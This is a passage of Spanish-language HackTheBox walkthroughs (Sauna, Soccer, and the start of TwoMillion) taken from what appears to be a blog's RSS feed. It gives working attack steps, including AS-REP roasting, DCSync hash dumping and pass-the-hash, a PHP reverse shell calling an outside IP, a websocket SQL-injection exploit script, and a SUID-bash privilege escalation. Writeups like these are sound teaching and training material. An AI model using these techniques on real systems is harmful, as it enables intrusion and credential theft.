&lt;pre&gt;&lt;code&gt;&amp;gt; ./username-anarchy --input-file listUsers.txt --select-format first,last,first.last,flast &amp;gt; users.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;También añadiré Administrador al archivo.&lt;/p&gt;
&lt;h3&gt;SMB - Port 445 Recon&lt;/h3&gt;
&lt;p&gt;Me gusta usar crackmapexec para enumerar SMB.&lt;/p&gt;
&lt;p&gt;Podemos ver el nombre de host, dominio y ver idf SMBv1 está habilitado.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175  
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;No podemos ver ningun shares.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A veces podemos intentar hacer una sesión nula para ver si conseguimos algo más. Una sesión nula es simplemente no proporcionar nada para el nombre de usuario y la contraseña. Pero todavía nada.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 --shares -u &apos;&apos; -p &apos;&apos;
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;También podemos probar con otra herramienta llamada smbmap a ver si nos da algo diferente pero no lo hace.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; smbmap -H 10.10.10.175

[+] IP: 10.10.10.175:445        Name: 10.10.10.175 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Kerbrute&lt;/h3&gt;
&lt;p&gt;Ahora que tengo una lista de posibles nombres de usuario puedo utilizar una herramienta llamada kerbrute para probar y ver si alguno de los nombres de usuario son válidos.&lt;/p&gt;
&lt;p&gt;Lo bueno de kerburte es que no crea el evento id 4625 en los logs. El evento id 4625 documentará cada log-on fallido. En su lugar se creará un evento Kerberos Failure id 4771, que no se registra por defecto.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL listUser.txt

2024/02/18 09:31:07 &amp;gt;  Using KDC(s):
2024/02/18 09:31:07 &amp;gt;  	10.10.10.175:88

2024/02/18 09:31:07 &amp;gt;  [+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.LOCAL
2024/02/18 09:31:07 &amp;gt;  Done! Tested 12 usernames (1 valid) in 0.285 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Kerberoast&lt;/h3&gt;
&lt;p&gt;Ahora que tenemos dos nombres de usuario válidos podemos aprovechar algunas secuencias de comandos Impacket github. El que usé en esta máquina fue GetNPUser.py que hará un AS_REP Roast/Kerberoast.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfa9cf66c4efa162cd18472a39b04966$5c796f89e55dfba2c4b0eccfa2b4198679aeddbfbddc37430a2bc75a49e472e05ccc330187a59c43f603b58e124e4c864c7d02d056056c6d782b32ca6156bb7b7b530effe162bdb7d7ce8470bebf8ce61238e23648957feed32538f0ee1f417c420243316ffb917605e649d42e249a5b2726a59ee9d2816edf045407b88dade504d12f41942faf1f244f5f29dc187e1c964677f66dc2e0160b6e56693f7f8a22816836215ecf22188e5024fb37f57e8e74b274d8eaa5b1296055ed33471620245ec1c7fb0653d0cd053156c314e181d0719c9f75c1032e3a4215c310378a1f3002ab5936223251ac1ea2190bf6fd74eb2c18e18067f186f1415533fddd6dea50
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora que tenemos un hash podemos utilizar hashcat para descifrarlo, hice esto en mi máquina host para utileze una GPU. obtenemos un éxito y ahora tenemos un creds fsmith:Thestrokes23&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; .\hascat.exe -m 18200 ..\hash ..\rockyou.txt --force

fsmith:Thestrokes23
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;SMB PT2&lt;/h3&gt;
&lt;p&gt;Ahora que tenemos unas credenciales válidas fsmith:Thestrokes23 podemos intentar autenticarnos en SMB de nuevo usando crackmapexec y podemos ver que ¡tenemos credenciales válidas!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A continuación voy a enumerar acciones y una sobresale RICOH Aficio SP 8300DN PCL 6&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [+] Enumerated shares
SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
SMB         10.10.10.175    445    SAUNA            C$                              Default share
SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6                 We cant print money
SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share 
                                                                                                      
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Echando un vistazo a searchsploit hay un puñado de exploits para esto pero primero necesitamos una shell. Podemos ver que podemos autenticar con winrm.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec winrm 10.10.10.175 -u &apos;fsmith&apos; -p &apos;Thestrokes23&apos; 
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Usaré evil-winrm para conseguir shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; evil-winrm -u fsmith -i 10.10.10.175 -p Thestrokes23
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Echando un vistazo al Escritorio podemos coger nuestra bandera de usuario.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;Lateral movement&lt;/h3&gt;
&lt;p&gt;He subido una gran herramienta llamada winPEAS que es genial para un poco de automatización cuando se trata de escalar. Lo subí usando Evil-Winrm&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Temp&amp;gt; upload winPEASx64.exe 
                                        
Info: Uploading /home/mhil4ne/Downloads/winPEASx64.exe to C:\Temp\winPEASx64.exe
                                        
Data: 3183272 bytes of 3183272 bytes copied
                                        
Info: Upload successful
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obtenemos una gran cantidad de resultados de esto, pero una sección sobresale en particular, el AutoLogon Una cuenta de servicio tiene un inicio de sesión automático activado y podemos cosechar svc_loanmgr:Moneymakestheworldgoround! como credenciales válidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos probar esas credenciales con Evil-Winrm y entramos&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; evil-winrm -u svc_loanmgr -i 10.10.10.175 -p Moneymakestheworldgoround!

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Get Administrator&lt;/h3&gt;
&lt;p&gt;Con estas credenciales, podemos ejecutar una herramienta llamada Bloodhound. Es una herramienta que encuentra relaciones ocultas dentro de Active Directory. A menudo puede conducir a una rápida escalada de privilegios. Hay una versión en python e impacket que usaré para Sauna.&lt;/p&gt;
&lt;p&gt;La instalación es muy sencilla.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo pip install bloodhound
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Entonces podemos ejecutar el comando:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Para iniciar el ataque. creó un montón de archivos .json que que vamos a importar en bloodhound.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ls
20240218112738_computers.json    20240218112738_domains.json   20240218112738_groups.json   20240218112738_users.json
20240218112738_containers.json   20240218112738_gpos.json      20240218112738_ous.json
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;para iniciar la consola bloodhound ejecuté neo4j console y luego bloodhound en la consola. A continuación, vamos a subir nuestros archivos haciendo clic en el botón de carga a la derecha.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Después de importar nuestros archivos podemos seleccionar «Find Principals with DCSync Rights» y genera un gráfico. Nuestra cuenta de servicio tiene dos permisos. Nótese que son permisos similares a los de los administradores.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GetChanges&lt;/li&gt;
&lt;li&gt;GetChangesAll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Hice clic con el botón derecho en la relación y seleccioné «Ayuda». En Abuse info,m me enteré de que podemos realizar un ataque dcsync para obtener hashes de contraseñas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Impacket tiene una herramienta llamada secretsdump.py que podemos utilizar para aprovechar esto.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator 
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora tenemos el Hash de los administradores. Podemos usarlo en un ataque pass the hash.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; evil-winrm -u Administrator -i 10.10.10.175 -H 823452073d75b9d1cf70ebdf86c7f98e
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;somos administradores.&lt;/p&gt;
</content:encoded></item><item><title>Soccer HTB Writeup</title><link>https://fuwari.vercel.app/posts/soccer/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/soccer/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comprobamos la conexión con la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.11.194
PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms

--- 10.10.11.194 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vamos a ejecutar nuestro escaneo con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap 10.10.11.194
Nmap scan report for 10.10.11.194
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tenemos 3 puertos abiertos en la máquina, en los que podemos encontrar 3 servicios.&lt;/p&gt;
&lt;p&gt;Lo primero que vamos a hacer es comprobar el puerto 80.&lt;/p&gt;
&lt;p&gt;Mirando la cabecera «Location» cuando hacemos una petición curl, podemos ver el dominio.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ curl -s 10.10.11.194 -I | grep Location
Location: http://soccer.htb/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Añadimos la dirección de este sitio web a nuestro archivo /etc/hosts.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ echo &quot;10.10.11.194 soccer.htb&quot; | sudo tee -a /etc/hosts
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Ahora podemos acceder al sitio web.&lt;/p&gt;
&lt;p&gt;Utilizamos gobuster para listar directorios.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
===============================================================
[+] Url:                     http://soccer.htb
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--&amp;gt; http://soccer.htb/tiny/]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Encontré un subdominio:http://soccer.htb/tiny/&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un gestor de archivos con un inicio de sesión.&lt;/p&gt;
&lt;p&gt;Busque credenciales por defecto en Internet:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Username: admin
Password: admin@123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Con esto obtenemos acceso al administrador de archivos. Podemos ver los archivos de la web y el directorio «tiny».&lt;/p&gt;
&lt;p&gt;También podemos ver que podemos subir archivos en este botón que aparece en la parte superior de la página.&lt;/p&gt;
&lt;p&gt;Podemos ver que la página está hecha en PHP, por lo que vamos a intentar enviar un ReverseShell en código PHP.&lt;/p&gt;
&lt;h3&gt;shell.php&lt;/h3&gt;
&lt;p&gt;Crea un archivo que puedes llamar «shell.php» en el que escribes el comando que se ejecutará en la máquina víctima.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    system(&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.85/443 0&amp;gt;&amp;amp;1&apos;&quot;)
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Aquí comparto un generador de shell inverso, Rev Shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Después de crear nuestro archivo, lo subimos al gestor de archivos.&lt;/p&gt;
&lt;h3&gt;Netcat&lt;/h3&gt;
&lt;p&gt;Escuchamos en el puerto 443.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sudo netcat -lvnp 443
[sudo] password for mhil4ne: 
listening on [any] 443 ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Llamamos a nuestro shell.php:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ curl soccer.htb/tiny/uploads/shell.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ya tengo un shell como www-data&lt;/p&gt;
&lt;h3&gt;Python Exploit&lt;/h3&gt;
&lt;p&gt;Hagamos una inyección SQL.&lt;/p&gt;
&lt;p&gt;Encontré un exploit escrito en Python para esto, modificamos algunas líneas de código para adaptarlo a la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = &quot;ws://soccer.htb:9091/&quot;

def send_ws(payload):
	ws = create_connection(ws_server)
	
	message = unquote(payload).replace(&apos;&quot;&apos;,&apos;\&apos;&apos;)
	data = &apos;{&quot;id&quot;:&quot;%s&quot;}&apos; % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return &apos;&apos;

def middleware_server(host_port,content_type=&quot;text/plain&quot;):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -&amp;gt; None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split(&apos;=&apos;,1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = &apos;No parameters specified!&apos;

			self.send_header(&quot;Content-type&quot;, content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print(&quot;[+] Starting MiddleWare Server&quot;)
print(&quot;[+] Sending payloads&quot;)

try:
	middleware_server((&apos;0.0.0.0&apos;,8081))
except KeyboardInterrupt:
	pass
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lo que hace este exploit es redirigir peticiones, vamos a ejecutarlo:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ python3 exploit.py
[+] Starting MiddleWare Server
[+] Sending payloads
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Sqlmap&lt;/h3&gt;
&lt;p&gt;Ahora, con sqlmap, tal y como habíamos configurado en el exploit de Python, apuntamos a nuestro localhost e intentamos listar las bases de datos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sqlmap -u &quot;http://127.0.0.1:8081/?id=1&quot; --batch -dbs
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tenemos la tabla «cuentas»:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sqlmap -u &quot;http://127.0.0.1:8081/?id=1&quot; --batch -D soccer_db -T accounts -columns
Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos interesan las columnas «nombre de usuario» y «contraseña».&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sqlmap -u &quot;http://127.0.0.1:8081/?id=1&quot; --batch -D soccer_db -T accounts -C username,password -dump
Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOfthe********* |
+----------+----------------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;SSH Connection&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh player@10.10.11.194
player@10.10.11.194&apos;s password: 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Ahora sólo tendríamos que subir los privilegios.&lt;/p&gt;
&lt;p&gt;Listamos el contenido de la siguiente ruta:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;player@soccer:~$ ls -la /usr/local/share/dstat
total 8
drwxrwx--- 2 root player 4096 Mar 14 16:21 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que tenemos capacidad de escritura en la ruta «share/dstat», donde se almacenan los Plugins.&lt;/p&gt;
&lt;p&gt;Lo que vamos a hacer es crear un archivo Python, y luego ejecutarlo como si fuera un Plugin, ya que tenemos permisos en esta ruta.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &apos;import os;os.system(&quot;chmod u+s /bin/bash&quot;)&apos; &amp;gt; dstat_privesc.py
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;doas -u root /usr/bin/dstat --privesc &amp;amp;&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;bash -p
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Aquí tenemos la Root&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bash-5.0# ls /root/root.txt
/root/root.txt
bash-5.0# 
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>TwoMillion HTB Writeup</title><link>https://fuwari.vercel.app/posts/twomillion/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/twomillion/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Primero un ping a la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.221                                                           
PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.
64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=2162 ms

--- 10.10.11.221 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2162.481/2162.481/2162.481/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Inicie el escaneo con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.221 -oG scan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 18:44 AST
Nmap scan report for 10.10.11.221
Host is up (0.089s latency).
Not shown: 61140 closed tcp ports (reset), 4393 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 44.46 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p22,80 -sVC 10.10.11.221                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 18:48 AST
Nmap scan report for 10.10.11.221 (10.10.11.221)
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.99 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Añadimos el dominio a nuestro /etc/hosts, vemos la página web (Puerto 80).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Feroxbuster&lt;/h3&gt;
&lt;p&gt;Vamos a aplicar fuzzing para ver posibles directorios en la web:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Al investigar cada uno de nuestros resultados tenemos 2 directorios interesantes /register y /js/inviteapi.min.js&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Generate a Invite Code&lt;/h3&gt;
&lt;p&gt;Al parecer, necesitamos un código de invitación para acceder.&lt;/p&gt;
&lt;p&gt;Miramos la otra ruta y vemos que es un script javascript:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;encontrar una función que nos cree un código de invitación&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que hace una petición POST a una api en /api/v1/invite/how/to/generate.&lt;/p&gt;
&lt;p&gt;Estoy tratando de hacer una solicitud a la API. (/api/v1) pero me dice que no existe por lo que intento generar un código.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; curl -sXPOST http://2million.htb/api/v1/invite/how/to/generate
{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Devuelve una cadena en ROT13&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; echo &apos;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&apos; | tr &apos;A-Za-z&apos; &apos;N-ZA-Mn-za-m&apos;
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Creamos nuestro código de invitación.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; curl -sXPOST http://2million.htb/api/v1/invite/generate
{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=&quot;,&quot;format&quot;:&quot;encoded&quot;}}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; echo &quot;VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=&quot; | base64 -d                                                                         
TM2FX-2Y19S-GBOC1-579MK
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora, con la cookie que se nos proporciona al iniciar sesión, podemos acceder a más puntos finales de la API.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;See more information with session cookie&lt;/h3&gt;
&lt;p&gt;Ahora, con la cookie que se nos proporciona al iniciar sesión, podemos acceder a más puntos finales de la API.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; curl -s http://2million.htb/api/v1 -b &apos;PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh&apos; | jq
{
  &quot;v1&quot;: {
    &quot;user&quot;: {
      &quot;GET&quot;: {
        &quot;/api/v1&quot;: &quot;Route List&quot;,
        &quot;/api/v1/invite/how/to/generate&quot;: &quot;Instructions on invite code generation&quot;,
        &quot;/api/v1/invite/generate&quot;: &quot;Generate invite code&quot;,
        &quot;/api/v1/invite/verify&quot;: &quot;Verify invite code&quot;,
        &quot;/api/v1/user/auth&quot;: &quot;Check if user is authenticated&quot;,
        &quot;/api/v1/user/vpn/generate&quot;: &quot;Generate a new VPN configuration&quot;,
        &quot;/api/v1/user/vpn/regenerate&quot;: &quot;Regenerate VPN configuration&quot;,
